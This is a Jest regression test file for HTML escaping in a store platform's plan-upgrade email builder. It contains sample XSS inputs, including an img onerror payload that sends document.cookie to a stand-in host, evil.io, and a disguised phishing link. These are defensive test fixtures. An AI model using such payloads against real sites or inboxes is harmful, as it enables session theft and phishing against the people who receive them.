/**
 * Regression tests for HTML injection in transactional email.
 *
 * Email bodies are built with template literals and user-controlled values were
 * interpolated raw. The highest-impact path is the plan-upgrade request, which
 * goes to the PLATFORM operator and includes a tenant-supplied store name — so
 * any store owner could inject markup into the platform owner's inbox.
 *
 * The pre-existing `safe()` helper in email.templates.ts only substitutes a
 * fallback for null/undefined; it performs no escaping.
 */

import { escapeHtml } from '../../src/utils/escapeHtml';
import { buildPlanUpgradeRequestEmail } from '../../src/modules/stores/store.service';

describe('escapeHtml', () => {
  it('neutralises a script tag', () => {
    expect(escapeHtml('<script>alert(1)</script>'))
      .toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it('escapes ampersands first so entities are not double-broken', () => {
    expect(escapeHtml('Tom & Jerry <b>')).toBe('Tom &amp; Jerry &lt;b&gt;');
  });

  it('escapes double quotes so attribute context cannot be broken', () => {
    expect(escapeHtml('" onerror="alert(1)'))
      .toBe('&quot; onerror=&quot;alert(1)');
  });

  it('escapes single quotes', () => {
    expect(escapeHtml("' onload='x")).toBe('&#39; onload=&#39;x');
  });

  it('returns an empty string for null/undefined', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('leaves ordinary text untouched', () => {
    expect(escapeHtml('Ada Shop')).toBe('Ada Shop');
  });

  it('stringifies non-strings', () => {
    expect(escapeHtml(42)).toBe('42');
  });
});

describe('plan upgrade request email', () => {
  const MALICIOUS_STORE = '<img src=x onerror="fetch(\'https://evil.io/?c=\'+document.cookie)">';

  it('does not emit a raw tag from a malicious store name', () => {
    const { html } = buildPlanUpgradeRequestEmail({
      storeId: '6a03b5108bdcd392044d1c37',
      storeName: MALICIOUS_STORE,
      ownerEmail: 'owner@test.com',
      requestedPlan: 'pro',
    });

    expect(html).not.toContain('<img src=x');
    expect(html).not.toContain('onerror="fetch');
    expect(html).toContain('&lt;img src=x');
  });

  it('escapes a malicious owner email', () => {
    const { html } = buildPlanUpgradeRequestEmail({
      storeId: '6a03b5108bdcd392044d1c37',
      storeName: 'Normal Shop',
      ownerEmail: '<a href="https://evil.io">click me</a>',
      requestedPlan: 'pro',
    });

    expect(html).not.toContain('<a href="https://evil.io"');
    expect(html).toContain('&lt;a href=');
  });

  it('still renders legitimate values readably', () => {
    const { html, subject, text } = buildPlanUpgradeRequestEmail({
      storeId: '6a03b5108bdcd392044d1c37',
      storeName: 'Ada Shop',
      ownerEmail: 'ada@test.com',
      requestedPlan: 'enterprise',
    });

    expect(html).toContain('Ada Shop');
    expect(html).toContain('ada@test.com');
    expect(html).toContain('ENTERPRISE');
    expect(subject).toContain('Ada Shop');
    expect(text).toContain('Ada Shop');
  });

  it('keeps the structural markup intact', () => {
    const { html } = buildPlanUpgradeRequestEmail({
      storeId: '6a03b5108bdcd392044d1c37',
      storeName: 'Ada Shop',
      ownerEmail: 'ada@test.com',
      requestedPlan: 'pro',
    });

    // Our own markup must survive — only the interpolated values are escaped.
    expect(html).toContain('<table');
    expect(html).toContain('Plan Upgrade Request');
  });

  it('escapes an ampersand in a legitimate store name without mangling it', () => {
    const { html } = buildPlanUpgradeRequestEmail({
      storeId: '6a03b5108bdcd392044d1c37',
      storeName: 'Tom & Jerry Toys',
      ownerEmail: 'tj@test.com',
      requestedPlan: 'pro',
    });

    expect(html).toContain('Tom &amp; Jerry Toys');
    expect(html).not.toContain('Tom & Jerry Toys');
  });
});
